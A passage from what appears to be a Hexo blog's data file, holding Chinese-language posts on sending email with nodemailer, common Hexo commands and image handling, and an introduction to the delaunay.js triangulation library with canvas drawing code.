list of receivers</span><br><span class=\"line\">        subject: &apos;Hello ✔&apos;, // Subject line</span><br><span class=\"line\">        text: &apos;Hello world?&apos;, // plain text body</span><br><span class=\"line\">        html: &apos;&lt;b&gt;Hello world?&lt;/b&gt;&apos; // html body</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    // send mail with defined transport object</span><br><span class=\"line\">    transporter.sendMail(mailOptions, (error, info) =&gt; &#123;</span><br><span class=\"line\">        if (error) &#123;</span><br><span class=\"line\">            return console.log(error);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        console.log(&apos;Message sent: %s&apos;, info.messageId);</span><br><span class=\"line\">        // Preview only available when sending through an Ethereal account</span><br><span class=\"line\">        console.log(&apos;Preview URL: %s&apos;, nodemailer.getTestMessageUrl(info));</span><br><span class=\"line\"></span><br><span class=\"line\">        // Message sent: &lt;b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com&gt;</span><br><span class=\"line\">        // Preview URL: https://ethereal.email/message/WaQKMgKddxQDoou...</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>这个是ethereal.email邮件测试账户的示例，我们重点看下代码，主要是三个部分：transporter，mailOptions，sendMail。</p>\n<p>首先，需要创建一个transporter实例对象，具体参数就像我们在邮件终端如foxmail中配置账户一样，需要注意的是pass，不是登录密码，而是授权码。（163邮箱的话，要开启POP3/SMTP服务，在设置 –&gt; POP3/SMTP/IMAP页面，设置。开通后会有个授权码的，配置里的密码，就是用这个授权码；qq邮箱的话，同样也要开启这个服务，设置 –&gt; 账户 –&gt; POP3服务，点击开启，就会有个授权码，如果忘了记录，在开启服务下面有个“生成授权码”的，可以获取到的。）</p>\n<p>其次，设置发送相关参数，这个与日常发邮件填写的参数一样，重点看下html参数，及示例没提到的attachments参数。html参数是邮件主题内容，值可以是html字符串，也可以是数据流，这个稍后使用实例再介绍；</p>\n<p>最后，调用transporter实例的sendMail方法，可以在回调函数中处理成功失败相关业务逻辑。</p>\n<h2 id=\"实例简介：\"><a href=\"#实例简介：\" class=\"headerlink\" title=\"实例简介：\"></a>实例简介：</h2><h3 id=\"上文提到mailOptions中的html参数值可以是数据流，具体代码如下：\"><a href=\"#上文提到mailOptions中的html参数值可以是数据流，具体代码如下：\" class=\"headerlink\" title=\"上文提到mailOptions中的html参数值可以是数据流，具体代码如下：\"></a>上文提到mailOptions中的html参数值可以是数据流，具体代码如下：</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 内容来自html文件</span><br><span class=\"line\">const htmlData = fs.readFileSync(&apos;email/template.html&apos;,&apos;utf-8&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">// 内容来自ejs模板</span><br><span class=\"line\">const template = ejs.compile(fs.readFileSync(path.resolve(__dirname, &apos;email/email.ejs&apos;), &apos;utf8&apos;));</span><br><span class=\"line\">const ejsData = template(&#123;</span><br><span class=\"line\">  title: &apos;Ejs&apos;,</span><br><span class=\"line\">  desc: &apos;使用Ejs渲染模板&apos;,</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let mailOptions = &#123;</span><br><span class=\"line\">\tfrom: &apos;&quot;sun&quot; &lt;&apos;+ config.user+&apos;&gt;&apos;, // sender address</span><br><span class=\"line\">\tto: &apos;&quot;sun&quot; &lt;xxxx@qq.com&gt;, xxxx@xxxx.com&apos;, // list of receivers</span><br><span class=\"line\">\tsubject: &apos;nodemailer测试demo&apos;, // Subject line</span><br><span class=\"line\">\t// text: &apos;Hello&apos;, // plain text body</span><br><span class=\"line\">\t// html: ejsData, // 内容来自ejs模板</span><br><span class=\"line\">\thtml: htmlData, // 内容来自html文件</span><br><span class=\"line\">\tattachments: [</span><br><span class=\"line\">\t\t&#123;   // utf-8 string as an attachment</span><br><span class=\"line\">\t\t\tfilename: &apos;text1.txt&apos;,</span><br><span class=\"line\">\t\t\tpath: path.resolve(__dirname, &apos;attachments/text.txt&apos;)</span><br><span class=\"line\">\t\t&#125;,</span><br><span class=\"line\">\t\t&#123;   // utf-8 string as an attachment</span><br><span class=\"line\">\t\t\tfilename: &apos;text2.txt&apos;,</span><br><span class=\"line\">\t\t\tcontent: &apos;i am text2.txt&apos;</span><br><span class=\"line\">\t\t&#125;,</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tfilename: &apos;蚂蚁头像.jpg&apos;,</span><br><span class=\"line\">\t\t\tpath: path.resolve(__dirname, &apos;attachments/mayi.jpg&apos;),</span><br><span class=\"line\">\t\t\tcid: &apos;mayi.jpg&apos;</span><br><span class=\"line\">\t\t&#125;,</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tfilename: &apos;二维码&apos;,</span><br><span class=\"line\">\t\t\tpath: path.resolve(__dirname, &apos;attachments/canvas.png&apos;),</span><br><span class=\"line\">\t\t\tcid: &apos;qrcode&apos;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t]</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h3 id=\"几个点强调下：\"><a href=\"#几个点强调下：\" class=\"headerlink\" title=\"几个点强调下：\"></a>几个点强调下：</h3><ul>\n<li><p>对于常见的邮件服务商可以用service替换host配置，具体支持情况见<a href=\"https://nodemailer.com/smtp/well-known/\" target=\"_blank\" rel=\"noopener\">service列表</a>。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let transporter = nodemailer.createTransport(&#123;</span><br><span class=\"line\">     service: &apos;QQ&apos;, // no need to set host or port etc.</span><br><span class=\"line\">     auth: &#123;</span><br><span class=\"line\">         user: &apos;account.email@example.com&apos;,</span><br><span class=\"line\">         pass: &apos;smtp-password&apos;</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">transporter.sendMail(...)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>attachments的使用，除了正常的添加附件外，还可以定义<code>cid</code>作为内容的引用源，附件配置见上文mailOptions示例代码，具体内容中使用如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=&quot;cid:qrcode&quot; alt=&quot;&quot; title=&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><a href=\"https://github.com/jovysun/sendMail\" target=\"_blank\" rel=\"noopener\">源代码</a></p>\n</li>\n</ul>\n<h1 id=\"备注\"><a href=\"#备注\" class=\"headerlink\" title=\"备注\"></a>备注</h1><p><a href=\"https://segmentfault.com/a/1190000012251328\" target=\"_blank\" rel=\"noopener\">https://segmentfault.com/a/1190000012251328</a></p>\n<p><a href=\"https://nodemailer.com/about/\" target=\"_blank\" rel=\"noopener\">https://nodemailer.com/about/</a></p>"},{"title":"hexo相关知识整理","date":"2018-07-10T08:51:19.000Z","updated":"2018-07-10T08:51:19.000Z","_content":"\n# 概述\nhexo写博客工具本身相关的知识整理，备忘。\n<!-- more -->\n\n# 详述\n\n## 常用命令\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n### 合并生成部署\n``` bash\n$ hexo d -g\n```\n### 建立草稿\n\n``` bash\n$ hexo new draft \"My New Draft\"\n```\n### 本机预览\n``` bash\n$ hexo s --draft\n```\n### 草稿发布\n``` bash\n$ hexo p \"My New Draft\"\n```\n### 指定布局模板\n``` bash\n$ hexo new 布局 \"文章名\"\n```\n\n## 博文插入图片\n\n### 1.安装插件\n```bash\nnpm install hexo-asset-image --save\n```\n### 2.修改配置`_config.yml`\n```yml\npost_asset_folder: true\n```\n### 3.使用\n创建博文同时会自动创建一个同名文件夹，把图片素材放入该文件夹，然后就可以在博文中引用了，示例如下：\n![hexo博文插入图片](01.jpg)\n\n\n## 多终端同步主题丢失\n1. 更新`$ git clone https://github.com/theme-next/hexo-theme-next themes/next-reloaded`\n2. 修改：修改对应主题中的`_config.yml`配置\n","source":"_posts/2018/2018-07-10-hexo-about.md","raw":"---\ntitle: hexo相关知识整理\ntags:\n  - hexo\n  - 备忘\ncategories:\n  - 其他\ndate: 2018-07-10 16:51:19\nupdated: 2018-07-10 16:51:19\n---\n\n# 概述\nhexo写博客工具本身相关的知识整理，备忘。\n<!-- more -->\n\n# 详述\n\n## 常用命令\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n### 合并生成部署\n``` bash\n$ hexo d -g\n```\n### 建立草稿\n\n``` bash\n$ hexo new draft \"My New Draft\"\n```\n### 本机预览\n``` bash\n$ hexo s --draft\n```\n### 草稿发布\n``` bash\n$ hexo p \"My New Draft\"\n```\n### 指定布局模板\n``` bash\n$ hexo new 布局 \"文章名\"\n```\n\n## 博文插入图片\n\n### 1.安装插件\n```bash\nnpm install hexo-asset-image --save\n```\n### 2.修改配置`_config.yml`\n```yml\npost_asset_folder: true\n```\n### 3.使用\n创建博文同时会自动创建一个同名文件夹，把图片素材放入该文件夹，然后就可以在博文中引用了，示例如下：\n![hexo博文插入图片](01.jpg)\n\n\n## 多终端同步主题丢失\n1. 更新`$ git clone https://github.com/theme-next/hexo-theme-next themes/next-reloaded`\n2. 修改：修改对应主题中的`_config.yml`配置\n","slug":"2018-2018-07-10-hexo-about","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8oj000pwovvadql8qae","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>hexo写博客工具本身相关的知识整理，备忘。<br><a id=\"more\"></a></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"常用命令\"><a href=\"#常用命令\" class=\"headerlink\" title=\"常用命令\"></a>常用命令</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">\"My New Post\"</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n<h3 id=\"合并生成部署\"><a href=\"#合并生成部署\" class=\"headerlink\" title=\"合并生成部署\"></a>合并生成部署</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo d -g</span><br></pre></td></tr></table></figure>\n<h3 id=\"建立草稿\"><a href=\"#建立草稿\" class=\"headerlink\" title=\"建立草稿\"></a>建立草稿</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new draft <span class=\"string\">\"My New Draft\"</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"本机预览\"><a href=\"#本机预览\" class=\"headerlink\" title=\"本机预览\"></a>本机预览</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo s --draft</span><br></pre></td></tr></table></figure>\n<h3 id=\"草稿发布\"><a href=\"#草稿发布\" class=\"headerlink\" title=\"草稿发布\"></a>草稿发布</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo p <span class=\"string\">\"My New Draft\"</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"指定布局模板\"><a href=\"#指定布局模板\" class=\"headerlink\" title=\"指定布局模板\"></a>指定布局模板</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new 布局 <span class=\"string\">\"文章名\"</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"博文插入图片\"><a href=\"#博文插入图片\" class=\"headerlink\" title=\"博文插入图片\"></a>博文插入图片</h2><h3 id=\"1-安装插件\"><a href=\"#1-安装插件\" class=\"headerlink\" title=\"1.安装插件\"></a>1.安装插件</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install hexo-asset-image --save</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-修改配置-config-yml\"><a href=\"#2-修改配置-config-yml\" class=\"headerlink\" title=\"2.修改配置_config.yml\"></a>2.修改配置<code>_config.yml</code></h3><figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">post_asset_folder:</span> <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"3-使用\"><a href=\"#3-使用\" class=\"headerlink\" title=\"3.使用\"></a>3.使用</h3><p>创建博文同时会自动创建一个同名文件夹，把图片素材放入该文件夹，然后就可以在博文中引用了，示例如下：<br><img src=\"/2018-2018-07-10-hexo-about/01.jpg\" alt=\"hexo博文插入图片\"></p>\n<h2 id=\"多终端同步主题丢失\"><a href=\"#多终端同步主题丢失\" class=\"headerlink\" title=\"多终端同步主题丢失\"></a>多终端同步主题丢失</h2><ol>\n<li>更新<code>$ git clone https://github.com/theme-next/hexo-theme-next themes/next-reloaded</code></li>\n<li>修改：修改对应主题中的<code>_config.yml</code>配置</li>\n</ol>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>hexo写博客工具本身相关的知识整理，备忘。<br></p>","more":"<p></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"常用命令\"><a href=\"#常用命令\" class=\"headerlink\" title=\"常用命令\"></a>常用命令</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">\"My New Post\"</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n<h3 id=\"合并生成部署\"><a href=\"#合并生成部署\" class=\"headerlink\" title=\"合并生成部署\"></a>合并生成部署</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo d -g</span><br></pre></td></tr></table></figure>\n<h3 id=\"建立草稿\"><a href=\"#建立草稿\" class=\"headerlink\" title=\"建立草稿\"></a>建立草稿</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new draft <span class=\"string\">\"My New Draft\"</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"本机预览\"><a href=\"#本机预览\" class=\"headerlink\" title=\"本机预览\"></a>本机预览</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo s --draft</span><br></pre></td></tr></table></figure>\n<h3 id=\"草稿发布\"><a href=\"#草稿发布\" class=\"headerlink\" title=\"草稿发布\"></a>草稿发布</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo p <span class=\"string\">\"My New Draft\"</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"指定布局模板\"><a href=\"#指定布局模板\" class=\"headerlink\" title=\"指定布局模板\"></a>指定布局模板</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new 布局 <span class=\"string\">\"文章名\"</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"博文插入图片\"><a href=\"#博文插入图片\" class=\"headerlink\" title=\"博文插入图片\"></a>博文插入图片</h2><h3 id=\"1-安装插件\"><a href=\"#1-安装插件\" class=\"headerlink\" title=\"1.安装插件\"></a>1.安装插件</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install hexo-asset-image --save</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-修改配置-config-yml\"><a href=\"#2-修改配置-config-yml\" class=\"headerlink\" title=\"2.修改配置_config.yml\"></a>2.修改配置<code>_config.yml</code></h3><figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">post_asset_folder:</span> <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"3-使用\"><a href=\"#3-使用\" class=\"headerlink\" title=\"3.使用\"></a>3.使用</h3><p>创建博文同时会自动创建一个同名文件夹，把图片素材放入该文件夹，然后就可以在博文中引用了，示例如下：<br><img src=\"/2018-2018-07-10-hexo-about/01.jpg\" alt=\"hexo博文插入图片\"></p>\n<h2 id=\"多终端同步主题丢失\"><a href=\"#多终端同步主题丢失\" class=\"headerlink\" title=\"多终端同步主题丢失\"></a>多终端同步主题丢失</h2><ol>\n<li>更新<code>$ git clone https://github.com/theme-next/hexo-theme-next themes/next-reloaded</code></li>\n<li>修改：修改对应主题中的<code>_config.yml</code>配置</li>\n</ol>"},{"title":"三角碎片动效（一）——认识delaunay.js","date":"2018-08-01T00:39:18.000Z","_content":"# 前言\n网上看到一种图片播放的效果，类似玻璃片碎裂，于是深究下去，发现源头来自一个国外的示例，核心是用了一个开源的三角剖分算法的js库——[delaunay.js](https://github.com/ironwallaby/delaunay)。因为之前没接触过，因此从零开始好好学习了下，在此记录下学习心得。[源码](https://github.com/jovysun/WOW/tree/master/delaunay)\n\n# 概述\n从我们动效应用层面的理解是，在一个平面内，产生有限的点集，根据算法，划分成若干个三角面，这些三角面的合集是散点集的凸包。具体详细的理论知识有兴趣的可以深究下去：[三角剖分](https://baike.baidu.com/item/%E4%B8%89%E8%A7%92%E5%89%96%E5%88%86/10390049?fr=aladdin)，[Delaunay三角剖分算法](https://baike.baidu.com/item/Delaunay%E4%B8%89%E8%A7%92%E5%89%96%E5%88%86%E7%AE%97%E6%B3%95/3779918)，[凸包](https://baike.baidu.com/item/%E5%87%B8%E5%8C%85)。\n## 效果展示\n![应用效果展示](preview.gif)\n\n<!-- more -->\n# 详述\n对于delaunay.js，官方没有接口文档，只给了一个示例：\n```\n      var canvas = document.getElementById(\"canvas\"),\n          ctx = canvas.getContext(\"2d\"),\n          vertices = new Array(4),\n          i, x, y;\n\n      for(i = vertices.length; i--; ) {\n        do {\n          x = Math.random() - 0.5;\n          y = Math.random() - 0.5;\n        } while(x * x + y * y > 0.25);\n\n        x = (x * 0.96875 + 0.5) * canvas.width;\n        y = (y * 0.96875 + 0.5) * canvas.height;\n\n        vertices[i] = [x, y];\n      }\n      console.log(vertices);\n      console.time(\"triangulate\");\n      var triangles = Delaunay.triangulate(vertices);\n      console.log(triangles);\n      console.timeEnd(\"triangulate\");\n\n      for(i = triangles.length; i; ) {\n        ctx.beginPath();\n        --i; ctx.moveTo(vertices[triangles[i]][0], vertices[triangles[i]][1]);\n        --i; ctx.lineTo(vertices[triangles[i]][0], vertices[triangles[i]][1]);\n        --i; ctx.lineTo(vertices[triangles[i]][0], vertices[triangles[i]][1]);\n        ctx.closePath();\n        ctx.stroke();\n      }\n```\n上半部分是获得点集vertices，下半部分是根据算出的三角端点绘制图形，重点就是中间的一行代码`var triangles = Delaunay.triangulate(vertices);`，这个就是调用接口，传入端点集生成三角端点索引。多说一句，vertices是二维数组表示的端点集，triangles是需要依次绘制的三角形的端点索引值。\n## 绘图展示\n三个点，一个三角面，四个点，两个三角面，如下图：\n![四点两面](delaunay3.jpg)\n但是细想下发现，四个点，可能三个三角面，如下图：\n![四点三面](delaunay4.jpg)\n## 数据展示\n四个点，两个三角面，如下图：\n![四点两面](delaunay1.jpg)\n![四点两面](delaunay5.jpg)\n四个点，三个三角面，如下图：\n![四点三面](delaunay2.jpg)\n![四点两面](delaunay6.jpg)\n## 更多点展示\n[delaunay算法在线展示](https://travellermap.com/tmp/delaunay.htm)\n\n这篇主要讲下三角剖分的概念及delaunay.js的理解和使用，下一篇将讲下具体的图片三角切分。\n# 备注\n[国内整理者](http://www.html5-css3.cn/article/9438)\n\n[原作者主页](https://zachsaucier.com/)\n\n[codepen效果展示](https://codepen.io/Zeaklous/pen/raltF)\n","source":"_posts/2018/2018-08-01-delaunay-1.md","raw":"---\ntitle: 三角碎片动效（一）——认识delaunay.js\ntags:\n  - 动效\n  - JavaScript\ncategories:\n  - 前端\ndate: 2018-08-01 08:39:18\n---\n# 前言\n网上看到一种图片播放的效果，类似玻璃片碎裂，于是深究下去，发现源头来自一个国外的示例，核心是用了一个开源的三角剖分算法的js库——[delaunay.js](https://github.com/ironwallaby/delaunay)。因为之前没接触过，因此从零开始好好学习了下，在此记录下学习心得。[源码](https://github.com/jovysun/WOW/tree/master/delaunay)\n\n# 概述\n从我们动效应用层面的理解是，在一个平面内，产生有限的点集，根据算法，划分成若干个三角面，这些三角面的合集是散点集的凸包。具体详细的理论知识有兴趣的可以深究下去：[三角剖分](https://baike.baidu.com/item/%E4%B8%89%E8%A7%92%E5%89%96%E5%88%86/10390049?fr=aladdin)，[Delaunay三角剖分算法](https://baike.baidu.com/item/Delaunay%E4%B8%89%E8%A7%92%E5%89%96%E5%88%86%E7%AE%97%E6%B3%95/3779918)，[凸包](https://baike.baidu.com/item/%E5%87%B8%E5%8C%85)。\n## 效果展示\n![应用效果展示](preview.gif)\n\n<!-- more -->\n# 详述\n对于delaunay.js，官方没有接口文档，只给了一个示例：\n```\n      var canvas = document.getElementById(\"canvas\"),\n          ctx = canvas.getContext(\"2d\"),\n          vertices = new Array(4),\n          i, x, y;\n\n      for(i = vertices.length; i--; ) {\n        do {\n          x = Math.random() - 0.5;\n          y = Math.random() - 0.5;\n        } while(x * x + y * y > 0.25);\n\n        x = (x * 0.96875 + 0.5) * canvas.width;\n        y = (y * 0.96875 + 0.5) * canvas.height;\n\n        vertices[i] = [x, y];\n      }\n      console.log(vertices);\n      console.time(\"triangulate\");\n      var triangles = Delaunay.triangulate(vertices);\n      console.log(triangles);\n      console.timeEnd(\"triangulate\");\n\n      for(i = triangles.length; i; ) {\n        ctx.beginPath();\n        --i; ctx.moveTo(vertices[triangles[i]][0], vertices[triangles[i]][1]);\n        --i; ctx.lineTo(vertices[triangles[i]][0], vertices[triangles[i]][1]);\n        --i; ctx.lineTo(vertices[triangles[i]][0], vertices[triangles[i]][1]);\n        ctx.closePath();\n        ctx.stroke();\n      }\n```\n上半部分是获得点集vertices，下半部分是根据算出的三角端点绘制图形，重点就是中间的一行代码`var triangles = Delaunay.triangulate(vertices);`，这个就是调用接口，传入端点集生成三角端点索引。多说一句，vertices是二维数组表示的端点集，triangles是需要依次绘制的三角形的端点索引值。\n## 绘图展示\n三个点，一个三角面，四个点，两个三角面，如下图：\n![四点两面](delaunay3.jpg)\n但是细想下发现，四个点，可能三个三角面，如下图：\n![四点三面](delaunay4.jpg)\n## 数据展示\n四个点，两个三角面，如下图：\n![四点两面](delaunay1.jpg)\n![四点两面](delaunay5.jpg)\n四个点，三个三角面，如下图：\n![四点三面](delaunay2.jpg)\n![四点两面](delaunay6.jpg)\n## 更多点展示\n[delaunay算法在线展示](https://travellermap.com/tmp/delaunay.htm)\n\n这篇主要讲下三角剖分的概念及delaunay.js的理解和使用，下一篇将讲下具体的图片三角切分。\n# 备注\n[国内整理者](http://www.html5-css3.cn/article/9438)\n\n[原作者主页](https://zachsaucier.com/)\n\n[codepen效果展示](https://codepen.io/Zeaklous/pen/raltF)\n","slug":"2018-2018-08-01-delaunay-1","published":1,"updated":"2019-05-28T07:14:01.403Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8ol000rwovv4x5rg7t8","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>网上看到一种图片播放的效果，类似玻璃片碎裂，于是深究下去，发现源头来自一个国外的示例，核心是用了一个开源的三角剖分算法的js库——<a href=\"https://github.com/ironwallaby/delaunay\" target=\"_blank\" rel=\"noopener\">delaunay.js</a>。因为之前没接触过，因此从零开始好好学习了下，在此记录下学习心得。<a href=\"https://github.com/jovysun/WOW/tree/master/delaunay\" target=\"_blank\" rel=\"noopener\">源码</a></p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>从我们动效应用层面的理解是，在一个平面内，产生有限的点集，根据算法，划分成若干个三角面，这些三角面的合集是散点集的凸包。具体详细的理论知识有兴趣的可以深究下去：<a href=\"https://baike.baidu.com/item/%E4%B8%89%E8%A7%92%E5%89%96%E5%88%86/10390049?fr=aladdin\" target=\"_blank\" rel=\"noopener\">三角剖分</a>，<a href=\"https://baike.baidu.com/item/Delaunay%E4%B8%89%E8%A7%92%E5%89%96%E5%88%86%E7%AE%97%E6%B3%95/3779918\" target=\"_blank\" rel=\"noopener\">Delaunay三角剖分算法</a>，<a href=\"https://baike.baidu.com/item/%E5%87%B8%E5%8C%85\" target=\"_blank\" rel=\"noopener\">凸包</a>。</p>\n<h2 id=\"效果展示\"><a href=\"#效果展示\" class=\"headerlink\" title=\"效果展示\"></a>效果展示</h2><p><img src=\"/2018-2018-08-01-delaunay-1/preview.gif\" alt=\"应用效果展示\"></p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" 